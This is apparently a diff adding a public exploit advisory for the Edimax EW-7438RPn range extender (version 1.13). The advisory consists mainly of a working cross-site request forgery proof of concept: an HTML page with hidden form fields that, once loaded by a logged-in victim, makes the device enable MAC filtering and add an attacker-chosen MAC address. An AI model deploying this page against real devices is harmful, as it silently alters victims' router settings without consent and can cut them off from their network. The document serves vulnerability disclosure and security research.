@@ -1,0 +1,32 @@
+# Exploit Title: Edimax EW-7438RPn - Cross-Site Request Forgery (MAC Filtering)
+# Date: 2020-04-21
+# Exploit Author: Besim ALTINOK
+# Vendor Homepage: https://www.edimax.com/edimax/merchandise/merchandise_detail/data/edimax/global/wi-fi_range_extenders_n300/ew-7438rpn_mini/
+# Version:1.13
+# Tested on: Edimax EW-7438RPn 1.13 Version
+
+
+CSRF PoC - Mac Filtering
+----------------------------------------------------------------------------------------------------------
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://172.20.10.2/goform/formWlAc" method="POST">
+      <input type="hidden" name="wlanAcEnabled" value="ON" />
+      <input type="hidden" name="tiny&#95;idx" value="0" />
+      <input type="hidden" name="mac" value="ccbbbbbbbbbb" />
+      <input type="hidden" name="comment" value="PentesterTraining" />
+      <input type="hidden" name="addFilterMac" value="Add" />
+      <input type="hidden" name="submit&#45;url"
+value="&#47;macfilter1&#95;sub1&#46;asp" />
+      <input type="hidden" name="wlanSSIDIndex" value="1" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+-- 
+
+Besim ALTINOK
+
+*Security Engineer*
